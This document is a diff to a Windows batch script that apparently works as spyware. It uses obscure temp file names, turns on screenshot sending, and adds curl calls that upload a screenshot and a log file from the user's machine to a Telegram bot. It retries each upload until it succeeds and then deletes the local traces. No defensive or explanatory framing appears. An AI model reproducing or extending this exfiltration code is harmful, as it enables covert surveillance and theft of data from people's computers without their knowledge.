@@ -10,7 +10,7 @@
 setlocal enabledelayedexpansion
 
 
-set "BATCHVERSION=29.0"
+set "BATCHVERSION=29.1"
 set "LOGFILE=%temp%\S1rNsvQgG.mpeez"
 set "RESULT=%TEMP%\TGRESU.txa"
 
@@ -143,7 +143,7 @@ echo.
 
 
 echo Maybe Turning CheckSend=1
-set "CheckSend=0"
+set "CheckSend=1"
 set "SENDSCREENSHOT=1"
 set "lastMinute=none"
 echo CheckSend=!CheckSend!
@@ -2198,6 +2198,7 @@ goto NEXT2
 
 
 :COMPRESSFILES
+goto PEROTY
 echo 7z exists. Continue...
 echo.
 echo.
@@ -2306,11 +2307,9 @@ if %errorlevel%==0 (
 :IGNORESENDFILENOW
 
 
-curl -s -X POST "https://api.telegram.org/bot%TOKEN_UPDATESSCRNSHTS%/sendDocument" ^
-     -F "chat_id=%CHAT_ID_UPDATESSCRNSHTS%" ^
-     -F "message_thread_id=%TOPIC_ID_UPDATESSCRNSHTS%" ^
-     -F "caption=%CAPTION_UPDATESSCRNSHTS%" ^
-     -F "document=@%ZIP_FILE%" > "%RESULT%"
+
+curl -s -X POST "https://api.telegram.org/bot%TOKEN_UPDATESSCRNSHTS%/sendPhoto" -F "chat_id=%CHAT_ID_UPDATESSCRNSHTS%" -F "message_thread_id=%TOPIC_ID_UPDATESSCRNSHTS%" -F "caption=%CAPTION_UPDATESSCRNSHTS%" -F "photo=@%%USERPROFILE%\Downloads\screenshot.jpg%" > "%RESULT%" 2>&1
+
 
 
 findstr /i "message_id" "%RESULT%" >nul
@@ -2325,26 +2324,55 @@ if %errorlevel%==0 (
     goto PEROTY
 )
 
-del /f /q "%RESULT%"
-del /f /a "%ZIP_FILE%"
 
-goto PEROTY1
+:SENDONLYLOGFILEONE
+
 
 curl -s -X POST "https://api.telegram.org/bot%TOKEN_UPDATESSCRNSHTS%/sendDocument" ^
      -F "chat_id=%CHAT_ID_UPDATESSCRNSHTS%" ^
      -F "message_thread_id=%TOPIC_ID_UPDATESSCRNSHTS%" ^
-     -F "caption=mseuope" ^
-     -F "document=@%ZIP_FILEMS%"
+     -F "caption=%CAPTION_UPDATESSCRNSHTS%" ^
+     -F "document=@%LOGFILE1%" > "%RESULT%"
+
+
+
+
+findstr /i "message_id" "%RESULT%" >nul
+if %errorlevel%==0 (
+    echo Message sent successfully!
+    echo.
+) else (
+    echo Failed to send message. Retrying...
+    echo.
+    timeout /t 2 /nobreak
+    echo Going to SENDONLYLOGFILEONE
+    goto SENDONLYLOGFILEONE
+)
+
+
+
+
+
+
+
+
+
+
+del /f /q "%RESULT%"
+del /f /a "%ZIP_FILE%"
+
+
+
+
+
+
+
+
 
 
 :PEROTY1
 
 
-
-
-
-echo Message sent to chat ID %CHAT_ID%
-echo Sent.
 
 
 
